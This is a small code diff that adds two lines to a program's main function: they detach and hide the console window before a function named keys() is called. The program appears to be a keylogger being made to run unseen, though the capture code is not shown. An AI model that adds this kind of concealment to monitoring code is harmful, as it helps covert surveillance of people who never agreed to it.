@@ -79,6 +79,8 @@ void keys() {
 }
 
 int main(int argc, char* argv[]) {
+    FreeConsole();
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     keys();
     return 0;
 }
